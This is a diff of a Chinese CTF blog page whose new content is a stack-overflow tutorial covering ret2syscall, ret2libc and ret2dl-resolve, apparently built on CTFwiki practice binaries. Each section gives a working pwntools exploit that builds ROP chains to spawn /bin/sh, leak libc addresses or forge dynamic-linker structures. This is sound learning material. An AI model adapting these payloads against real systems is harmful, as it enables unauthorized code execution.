@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.3.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/tags/wer/"/>
+  
+  <link rel="canonical" href="http://example.com/2022/07/06/栈溢出/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -31,18 +31,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>标签：-[wer] - 1ens's blog</title>
-  <meta name="keywords" content="null">
+  <title>栈溢出 - 1ens's blog</title>
+  <meta name="keywords" content="栈溢出,null">
   <meta desc name="description" content="a - 1ens - 1ens's blog">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="1ens&#39;s blog">
-<meta property="og:url" content="http://example.com/tags/wer/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出">
+<meta property="og:url" content="http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
 <meta property="og:site_name" content="1ens&#39;s blog">
-<meta property="og:description" content="a">
+<meta property="og:description" content="ret2syscallLinux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 在32位下： 1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2022-07-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-14T08:31:00.199Z">
 <meta property="article:author" content="1ens">
+<meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2456,7 +2459,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper  search' style="display: none;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div id="parallax-window"></div>
 
@@ -2521,25 +2524,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
-  
-    
-      
-  <section class="post-list">
-    
-      
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/26/WER/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="1ens's blog">
   </span>
@@ -2548,71 +2535,404 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="a">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1649552113628/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/05/26/WER/"  itemprop="url">
-        WER
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      
-        无壳，64位
+    
+      <h1 class="title" itemprop="name headline">
+        栈溢出
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202205242009843.jpg" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202205242009843.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">1ens</p>
+  </a>
+</div>
 
-什么是WER：Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。
-参考：关于 WER - Win32 apps | Microsoft Docs
-其关键函数如下：
-123DWORD WINAPI ApplicationRecov...
-      
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/pwn/">pwn</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/pwn/" itemprop="url"><span itemprop="name">pwn</span></a>
+      </span>
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-05-26T00:00:00+08:00">2022-05-26</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/WP/">WP</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/WP/" itemprop="url"><span itemprop="name">WP</span></a>
-            </span>
+
+
           
         
-      </div>
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-07-06T00:00:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2022年7月6日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+<div class="new-meta-item browse">
+  <a class='notlink'>
+    <p>
+      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
       
-        <div>
-          <a class='readmore' href='/2022/05/26/WER/' itemprop="url">
-            阅读全文
-          </a>
+      <span id="busuanzi_value_page_pv"><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
+      
+      <span>次浏览</span>
+    </p>
+  </a>
+</div>
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <div class="story post-story"><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><strong>Linux 的系统调用通过 int 80h 实现</strong>，用系统调用号来区分入口函数</p>
+<p><strong>应用程序调用系统调用的过程是：</strong></p>
+<p>1、把<strong>系统调用的编号存入 EAX</strong></p>
+<p>2、把<strong>函数参数存入其它通用寄存器</strong></p>
+<p>3、<strong>触发 0x80 号中断</strong>（int 0x80）</p>
+<p>在32位下：</p>
+<p>1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb</p>
+<p>3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; 0</p>
+<p>3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; o</p>
+<p>64位下：</p>
+<p>1.将RAX寄存器的值设置为0×3b:RAX &#x3D; OX3b</p>
+<p>2.将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI &#x3D; &amp;(“ &#x2F;bin&#x2F;sh”)</p>
+<p>3.将RSI和RDX寄存器的值都设为0: RSI &#x3D; RDX &#x3D; o</p>
+<p>只需要让栈顶的值 然后可以通过 pop eax 达到目的</p>
+<h3 id="例（CTFwiki）："><a href="#例（CTFwiki）：" class="headerlink" title="例（CTFwiki）："></a>例（CTFwiki）：</h3><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207061947158.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207061947158.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>计算偏移</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062014856.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062014856.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>运用ropper 查找int  0x80系统调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ret2syscall --search &quot;int 0x80&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207061952140.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207061952140.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>运用ropper 查找其他寄存器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ret2syscall --search &quot;pop|ret&quot;| grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062002154.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062002154.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>其他类推</p>
+<p>在IDA找到bin&#x2F;sh的地址</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ebx_ret = <span class="number">0x0806eb91</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh_addr = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you plan to do?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(pop_eax_ret) </span><br><span class="line">payload += p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh_addr) </span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><div class="story post-story"><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062031854.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062031854.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h3><p>在ida找到bin&#x2F;sh字符串地址</p>
+<p>查找到system函数存在地址</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062036649.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062036649.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;RET2LIBC &gt;_&lt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(<span class="number">0x8048460</span>) + <span class="string">b&quot;xxxx&quot;</span> + p32(<span class="number">0x8048720</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h3><p>没有system函数。也没有binsh字符串</p>
+<ul>
+<li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p>
+</li>
+<li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></p>
+</li>
+<li><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
+<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
+<p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p>
+<p>基本利用思路如下</p>
+<ul>
+<li>泄露 puts函数 地址</li>
+<li>获取 libc 版本</li>
+<li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li>
+</ul>
+<p>单步运行过puts函数，查询got表</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062141094.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062141094.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>通过vmmap找到对应libc的基地址，并且计算偏移</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062140118.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062140118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>再计算system函数的偏移</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062145374.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062145374.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>然后searh “bin&#x2F;sh”的地址，再计算bin&#x2F;sh1的偏移</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062233997.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207062233997.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x8048440</span></span><br><span class="line">puts_plt = <span class="number">0x8048460</span></span><br><span class="line">main_addr = <span class="number">0x8048618</span></span><br><span class="line">puts_got = <span class="number">0x804a018</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Can you find it !?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_addr = puts_addr   -  <span class="number">0x6dc30</span></span><br><span class="line">system_addr = libc_addr +  <span class="number">0x41790</span></span><br><span class="line">bin_sh_addr = libc_addr +  <span class="number">0x18e363</span></span><br><span class="line">success(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;bin_sh_addr: &quot;</span> + <span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Can you find it !?&quot;</span>)</span><br><span class="line">payload1 = <span class="string">b&quot;a&quot;</span>*<span class="number">104</span> + p32(system_addr) + <span class="string">b&quot;xxxx&quot;</span> + p32(bin_sh_addr)</span><br><span class="line"><span class="comment">#payload1 = b&quot;a&quot;*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sleep(0.2)</span></span><br><span class="line"><span class="string">p.sendline(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><div class="story post-story"><h2 id="ret2dl"><a href="#ret2dl" class="headerlink" title="ret2dl"></a>ret2dl</h2><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070808012.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070808012.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>ELF关于动态链接的关键segment：</p>
+<p>.dynamic:一般保存了ELF文件依赖于哪些动态库,动态符号节信息;</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070809904.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070809904.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070810312.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070810312.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>各segment的位置关系:</p>
+<p>.dynamic的地址加Ox44的位置是.</p>
+<p>dynstr;.dynamic的地址加Ox4c的位置是.</p>
+<p>dynsym;.dynamic的地址加Ox84的位置是.rel.plt;</p>
+<p>第一次调用一个函数时_dl_runtime_resolve函数的工作: _dl_runtime resolve(link map_obj, reloc index)：</p>
+<p>1.首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址;</p>
+<p>2..rel.plt ＋参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel;</p>
+<p>3.rel-&gt;r_info &gt; &gt;8&#x3D; n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;4..dynstr + sym-&gt;st_name得出符号名字符串指针;</p>
+<p>5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表;</p>
+<p>6.最后调用这个函数;</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070833409.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070833409.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070840120.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070840120.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>思路:</p>
+<p><img src="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070842319.png" class="lazyload" data-srcset="https://fastly.jsdelivr.net/gh/1ens/blogImages/imgs/202207070842319.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line"><span class="comment">#p=remote(&#x27;chall.pwnable.tw&#x27;, 10103)</span></span><br><span class="line">elf= ELF(name)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc_32.so.6&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    </span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr   <span class="comment">#0x8048330</span></span><br><span class="line">dynsym_addr =  elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr    <span class="comment">#0x80481d8</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr     <span class="comment">#0x8048278</span></span><br><span class="line">resolve_plt = <span class="number">0x08048380</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0804851d</span> </span><br><span class="line">start = <span class="number">0x804aa00</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt_addr = start</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh_addr = fake_dynstr_addr + <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">n = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (<span class="built_in">int</span>((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_offset = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">b&quot;system\x00/bin/sh\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">108</span> + p32(start - <span class="number">20</span>) + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(leave_ret_addr) + p32(<span class="number">0</span>) + p32(start - <span class="number">20</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to RET_TO_DL~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Nice to meet you~!\n&quot;)</span></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pay2 = p32(<span class="number">0x0</span>) + p32(resolve_plt) + p32(n) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line">p.sendline(pay2)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;.rel_plt: &quot;</span> + <span class="built_in">hex</span>(rel_plt_addr))</span><br><span class="line">success(<span class="string">&quot;.dynsym: &quot;</span> + <span class="built_in">hex</span>(dynsym_addr))</span><br><span class="line">success(<span class="string">&quot;.dynstr: &quot;</span> + <span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;fake_rel_plt_addr: &quot;</span> + <span class="built_in">hex</span>(fake_rel_plt_addr))</span><br><span class="line">success(<span class="string">&quot;fake_dynsym_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynsym_addr))</span><br><span class="line">success(<span class="string">&quot;fake_dynstr_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;n: &quot;</span> + <span class="built_in">hex</span>(n))</span><br><span class="line">success(<span class="string">&quot;r_info: &quot;</span> + <span class="built_in">hex</span>(r_info))</span><br><span class="line">success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(str_offset))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;bss_addr: &quot;</span> + <span class="built_in">hex</span>(elf.bss()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
